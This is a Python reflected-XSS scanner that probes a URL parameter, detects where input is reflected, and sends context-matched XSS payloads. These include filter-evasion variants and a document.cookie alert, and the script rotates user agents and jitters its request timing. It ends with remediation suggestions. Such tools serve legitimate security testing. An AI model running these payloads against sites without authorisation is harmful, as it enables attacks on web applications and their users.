```python
#!/usr/bin/env python3
import requests
import json
import sys
import time
import random
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from html.parser import HTMLParser

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
]

class XSSTester:
    def __init__(self, base_url, test_param='q'):
        self.base_url = base_url.rstrip('/')
        self.test_param = test_param
        self.session = requests.Session()
        self.results = []
        self.normal_response = None
        self.probe = "probetest'\"<>_" + str(random.randint(1000, 9999))
        self.alert_token = "xsstest_" + str(random.randint(1000, 9999))
        self.payload_templates = {
            'html': [
                "<script>alert('{alert}')</script>",
                "<img src=x onerror=alert('{alert}')>",
                "<svg onload=alert('{alert}')>",
                "<body onload=alert('{alert}')>",
                "<iframe src=\"javascript:alert('{alert}')\">",
                "<scr<script>ipt>alert('{alert}')</scr</script>ipt>",
                "<script>alert`{alert}`</script>",
                "<ScRiPt>alert('{alert}')</ScRiPt>",
            ],
            'attribute': [
                "\"><script>alert('{alert}')</script>",
                "'><script>alert('{alert}')</script>",
                " onmouseover=alert('{alert}') ",
                "\" onload=alert('{alert}') ",
            ],
            'js': [
                "';alert('{alert}');//",
                "\";alert('{alert}');//",
                "');alert('{alert}')//",
                "\");alert('{alert}')//",
                "-alert('{alert}')-'",
                "javascript:alert('{alert}')",
            ],
            'general': [
                "#<script>alert('{alert}')</script>",
                "javascript:alert(document.cookie)",  # Kept as is for cookie test
            ]
        }
        self.signature_re = re.compile(
            fr"<script>.*alert\(['\"`]?{self.alert_token}['\"`]? *\)|"
            fr"alert\(['\"`]?{self.alert_token}['\"`]? *\)|"
            fr"onerror=alert\(['\"`]?{self.alert_token}['\"`]? *\)|"
            fr"onload=alert\(['\"`]?{self.alert_token}['\"`]? *\)|"
            fr"onmouseover=alert\(['\"`]?{self.alert_token}['\"`]? *\)|"
            fr"javascript:alert\(['\"`]?{self.alert_token}['\"`]? *\)",
            re.IGNORECASE
        )

    def log(self, message, status="INFO"):
        print(f"[{status}] {message}")

    def get_random_user_agent(self):
        return random.choice(USER_AGENTS)

    def perform_normal_request(self, url):
        try:
            headers = {'User-Agent': self.get_random_user_agent()}
            response = self.session.get(url, headers=headers, timeout=10)
            return response
        except Exception:
            return None

    def detect_context(self):
        if not self.normal_response:
            return []
        resp_text = self.normal_response.text

        class ContextParser(HTMLParser):
            def __init__(self, probe):
                super().__init__()
                self.probe = probe
                self.contexts = []
                self.current_tag = None
                self.current_attrs = None

            def handle_starttag(self, tag, attrs):
                self.current_tag = tag
                self.current_attrs = attrs
                for name, value in attrs:
                    if self.probe in value:
                        self.contexts.append(f"attribute '{name}' in tag '{tag}'")

            def handle_data(self, data):
                if self.probe in data:
                    if self.current_tag == 'script':
                        self.contexts.append("javascript context")
                    elif self.current_tag == 'style':
                        self.contexts.append("css context")
                    else:
                        self.contexts.append("html text context")

            def handle_comment(self, data):
                if self.probe in data:
                    self.contexts.append("html comment")

        parser = ContextParser(self.probe)
        try:
            parser.feed(resp_text)
        except:
            pass
        return parser.contexts

    def test_xss(self):
        """Test for reflected XSS vulnerabilities"""
        self.log("Testing for reflected XSS...")
        self.log("Note: DOM-based XSS requires JavaScript execution and is not fully tested here. Manual testing with a browser or tools like Selenium is recommended.")
        other_endpoints = [self.base_url]  # Add more if known, e.g., forms

        # Probe request to detect contexts
        normal_url = self.base_url + "?" + urlencode({self.test_param: self.probe})
        self.normal_response = self.perform_normal_request(normal_url)
        contexts = self.detect_context()

        vulnerable = False
        if not contexts:
            self.log("No reflection of input detected in HTML response. If the parameter is used in client-side JavaScript, it may be vulnerable to DOM-based XSS. Manual inspection required.")
        else:
            self.log(f"Detected reflection contexts: {', '.join(contexts)}")

            # Select payloads based on contexts
            selected_templates = []
            if any("html text" in c or "html comment" in c for c in contexts):
                selected_templates += self.payload_templates['html']
            if any("attribute" in c for c in contexts):
                selected_templates += self.payload_templates['attribute']
            if any("javascript" in c for c in contexts):
                selected_templates += self.payload_templates['js']
            selected_templates += self.payload_templates['general']
            selected_templates = list(set(selected_templates))  # Remove duplicates

            payloads = [t.format(alert=self.alert_token) for t in selected_templates]

            for i, payload in enumerate(payloads):
                for endpoint in other_endpoints:
                    # Test in query params
                    test_endpoint = endpoint + "?" + urlencode({self.test_param: payload})
                    time.sleep(random.uniform(1, 5))  # Jitter
                    try:
                        headers = {'User-Agent': self.get_random_user_agent()}
                        response = self.session.get(test_endpoint, headers=headers, timeout=10)
                        finding_id = f"XSS-{len(self.results) + 1}"
                        context_info = {
                            "auth_required": False,
                            "public_endpoint": True,
                            "user_controlled_input": True,
                            "reflection_contexts": contexts
                        }
                        # Check if payload reflected and executable
                        resp_text = response.text
                        if self.signature_re.search(resp_text):
                            self.log(f"⚠️ Potential XSS at {test_endpoint}! (Payload {i+1})", "WARNING")
                            vulnerable = True
                            self.results.append({
                                "finding_id": finding_id,
                                "vulnerability": "XSS - Reflected",
                                "endpoint": test_endpoint,
                                "payload": payload,
                                "response_snippet": resp_text[:200],
                                "context": context_info,
                                "status": "NOT_CONFIRMED"
                            })
                    except Exception as e:
                        self.log(f"Error testing payload {i+1} at {test_endpoint}: {e}", "ERROR")

        return vulnerable

    def run_xss_test(self):
        self.log(f"Starting XSS tests for {self.base_url}")
        self.log("=" * 60)
        vulnerable = self.test_xss()
        status = "POTENTIAL VULNERABILITIES ⚠️" if vulnerable else "SECURE ✅"
        self.log(f"XSS: {status}")
        # Summary and report
        self.save_report()
        self.analyze_with_rules()

    def save_report(self):
        report = {
            "base_url": self.base_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "vulnerabilities": self.results
        }
        try:
            with open("xss_report.json", "w") as f:
                json.dump(report, f, indent=2)
            self.log("Detailed report saved to 'xss_report.json'")
        except Exception as e:
            self.log(f"Error saving report: {e}", "ERROR")

    def analyze_with_rules(self):
        self.log("Performing rule-based analysis on findings...")
        # Similar to original, with XSS specific suggestions
        suggestion_map = {
            "XSS - Reflected": {
                "suggestions": ["Encode user input", "Use CSP headers", "Sanitize HTML"],
                "why": "User input reflected without encoding, allowing script execution.",
                "what": "Payload executed in response.",
                "how": "Attacker injects script via params, executed in browser.",
                "confirmed": False,
                "risk_level": "High"
            }
        }
        # ... (implement analysis printing/saving similar to original)
        for result in self.results:
            vuln_type = result["vulnerability"]
            if vuln_type in suggestion_map:
                print(f"Analysis for {result['finding_id']}:")
                print(json.dumps(suggestion_map[vuln_type], indent=2))

def main():
    if len(sys.argv) < 2:
        print("Usage: python xss_test.py <base_url> [test_param]")
        sys.exit(1)
    base_url = sys.argv[1]
    test_param = sys.argv[2] if len(sys.argv) > 2 else 'q'
    if not base_url.startswith(('http://', 'https://')):
        base_url = 'https://' + base_url
    tester = XSSTester(base_url, test_param)
    tester.run_xss_test()

if __name__ == "__main__":
    main()
```
